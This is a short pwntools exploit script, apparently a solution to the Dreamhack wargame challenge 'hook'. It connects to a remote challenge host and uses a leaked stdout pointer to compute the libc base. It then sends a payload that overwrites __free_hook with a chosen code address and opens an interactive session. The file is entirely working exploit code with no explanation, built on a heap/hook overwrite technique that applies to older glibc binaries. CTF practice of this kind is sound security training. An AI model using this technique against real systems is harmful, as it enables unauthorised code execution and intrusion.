from pwn import *

context.log_level = True

# p = process('./hook')
p = remote('host3.dreamhack.games', 13801)
e = ELF('./hook')
libc = ELF('./libc-2.23.so')
l40_address = 0x00400a11

p.recvuntil('stdout: ')
stdout = int(p.recvuntil('\n')[:-1], 16)

libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
free_hook = libc_base + libc.symbols['__free_hook']

payload = p64(free_hook) + p64(l40_address)

p.sendlineafter("Size: ", "400")
p.sendafter("Data: ", payload)

p.interactive()
